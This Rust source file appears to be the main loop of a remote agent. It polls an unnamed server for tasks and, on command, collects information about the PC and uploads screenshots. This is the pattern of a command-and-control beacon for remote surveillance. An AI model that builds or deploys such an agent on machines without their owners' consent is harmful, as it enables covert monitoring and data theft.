use reqwest;
use tokio;
use std;
mod action;

const URL_API: &str = "";
const KEY_INFO_PC: &str = "/info/pc";
const KEY_COLLECTION_PC: &str = "/info/collection_pc";
const KEY_INFO_POLLING: &str = "/info/polling";
const KEY_MEDIA_UPLOAD_SCREENSHOT: &str = "/media/upload_screenshot";


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    action::request_info_polling(format!("{}{}", URL_API, KEY_INFO_POLLING), &client, "on_pc")
        .await?;
    loop {
        let tasks = action::request_info_polling(
            format!("{}{}", URL_API, KEY_INFO_POLLING),
            &client,
            "polling",
        )
        .await?;
        tokio::time::sleep(tokio::time::Duration::from_secs_f32(0.5)).await;
        if tasks.tasks.is_empty() {
            continue;
        }
        for task in tasks.tasks.iter() {
            if let Some(Some(task_type)) = task.get("type") {
                if task_type == "info_pc" {
                    action::request_info_pc(
                        URL_API,
                        KEY_INFO_PC,
                        KEY_COLLECTION_PC,
                        &client,
                        false,
                    )
                    .await?;
                    }
                if task_type == "collection_pc" {
                    action::request_info_pc(URL_API, KEY_INFO_PC, KEY_COLLECTION_PC, &client, true)
                        .await?;
                    }
                if task_type == "screenshot" {
                    action::request_media_screenshot(format!("{}{}", URL_API, KEY_MEDIA_UPLOAD_SCREENSHOT), &client)
                    .await?;
                }
                
            }
        }
    }
}
